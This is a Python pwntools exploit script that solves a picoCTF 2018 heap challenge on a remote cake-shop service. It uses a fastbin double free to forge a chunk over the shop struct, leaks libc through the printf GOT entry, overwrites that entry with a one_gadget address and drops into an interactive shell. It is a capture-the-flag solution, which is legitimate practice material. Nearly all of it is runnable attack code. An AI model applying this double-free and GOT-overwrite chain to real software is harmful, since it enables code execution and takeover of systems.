#!/bin/python2
from pwn import *
import re

context.terminal = ["termite", "-e"]
cidx = 0

def alloc(p, name, price):
    p.sendline("M")
    p.sendlineafter("Name>", name)
    p.sendlineafter("Price>", str(price))
    global cidx
    cidx = cidx + 1
    return cidx - 1

def free(p, i):
    p.sendline("S")
    p.sendlineafter("This customer looks really hungry. Which cake would you like to give them?", str(i))
    p.recvuntil("The customer looks really happy with !")

def leak(p, i):
    p.clean()
    p.sendline("I")
    p.sendlineafter("Which one?", str(i))
    leak = p.recvline_contains("is being sold for")
    leak = leak.split('$')[-1]
    return int(leak)

def break_heap():
    global cidx
    p = remote('2018shell1.picoctf.com', 36903)
    '''
    set customers to 0x21 so we can control more of the array,
    and so that it is a valid chunk
    '''
    shop = 0x6030e0 #address of shop struct
    p_plt = 0x603048 # &printf.got
    p_off = 0x55800 # offset from libc base to printf
    one_gadget = 0x45216 # magic one gadget

    A = alloc(p, "", 16)
    B = alloc(p, "", 17)
    free(p, A) # A->bk NULL, A = fastbin freelist top
    free(p, B) # B->bk = A, B = fastbin freelist top
    free(p, A) # A->bk = B, A = fastbin freelist top
    # overwrite A->bk with fake chunk before shop. (set shop->price and fchunk size)
    C = alloc(p, "", int(shop-0x8))

    D = alloc(p, "", 0) # next malloc returns B
    E = alloc(p, "", 0) # this alloc returns A
    # Next alloc returns shop+0x8. Overwrite customers with shop-0x8 and counter[0] with got addr
    F = alloc(p, struct.pack("L", p_plt), int(shop-0x8))

    # Libc leak from dereferencing overwritten counter[0]
    libc = leak(p, 0) - p_off
    log.info('libc base is at: ' + hex(libc))
    # Next step is redoing step 1) except now the forged chunk->next will point to shop-0x8
    # Then we will NULL out counter[0]
    # The following address will be shop-0x8 which means counter[0]->name will overwrite counter[0]
    # And we can get an arbitrary write primitive

    #you know the drill
    free(p, D) # D->bk NULL, D fastbin freelist head
    free(p, E) # E->bk NULL, E fastbin freelist head
    free(p, D) # D->bk = E, D fastbin freelist head
    # overwrite D->bk with fake chunk before shop
    G = alloc(p, "", int(shop-0x8))

    H = alloc(p, "", 0) # this malloc returns E
    I = alloc(p, "", 0) # this malloc returns D
    J = alloc(p, struct.pack("L", 0), 0) # this malloc returns shop+0x8
    K = alloc(p, struct.pack("L", p_plt), libc + one_gadget)

    p.interactive()

break_heap()
